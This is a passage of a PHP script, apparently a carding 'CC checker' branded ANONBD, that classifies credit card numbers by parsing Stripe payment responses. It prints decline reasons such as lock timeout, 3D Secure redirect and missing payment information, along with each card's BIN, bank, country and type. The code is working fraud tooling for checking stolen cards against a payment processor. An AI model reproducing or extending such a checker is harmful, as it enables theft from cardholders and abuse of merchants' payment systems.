    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> | <span class="badge badge-warning">Reason: Parameter Invalid Empty</span> |  <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 ANONBD 👑 </span></br>';
  } 

elseif
(strpos($result2,  "lock_timeout")) {
    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> | <span class="badge badge-warning">Reason: Lock Timeout</span> |  <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 ANONBD 👑 </span></br>';
  } 

elseif
(strpos($result2,  "transaction_not_allowed")) {
    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> | <span class="badge badge-warning">Reason: Transaction Not Allowed</span> |  <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 ANONBD 👑 </span></br>';
  } 

elseif
(strpos($result2, "window.location.href")) {
    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> | <span class="badge badge-warning">Reason: 3D Secure Redirect</span> |  <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 ANONBD 👑 </span></br>';
  } 

elseif
(strpos($result2,  'Card is declined by your bank, please contact them for additional information.')) {
    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> | <span class="badge badge-warning">Reason: Card Is Declined By Your Bank, Please Contact Them For Additional Information.</span> |  <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 𝑫𝑹𝑨𝑮𝑶𝑵#𝑴𝑨𝑺𝑻𝑬𝑹 👑 </span></br>';
  } 

elseif
(strpos($result2, "missing_payment_information")) {
    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> | <span class="badge badge-warning">Reason: Missing Payment Information</span> |  <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 ANONBD 👑 </span></br>';
  } 

elseif
(strpos($result2, "Payment cannot be processed, missing credit card number")) {
    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> | <span class="badge badge-warning">Reason: Payment Cannot Be Processed, Missing Credit Card Number</span> |  <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 ANONBD 👑 </span></br>';
  } 

# ----------------------------------------------------- [Reprovada,Decline Responses END ] -------------------------------------- #



# ------------------------------------------- [UPDATE,PROXY DEAD , CC CHECKER DEAD Responses ] ---------------------------------- #

elseif 
(strpos($result2,  '-1')) {
    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> | <span class="badge badge-warning">Reason: Update Nonce </span> |  <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 ANONBD 👑 </span></br>';
  }

else {
    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> | <span class="badge badge-warning">Reason: Dead</span> | <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span> | <span class="badge badge-success"> 👑 ANONBD 👑 </span></br>';
  }
# --------------------------------- [UPDATE,PROXY DEAD , CC CHECKER DEAD Responses END ] --------------------------------------- #

# ----------------------------------------------------------- [Responses END] --------------------------------------------------- #

curl_close($ch);
ob_flush();

//echo "<b>Result:</b> $result1<br><br>";
echo "<b>Result:</b> $result2<br><br>";

?>
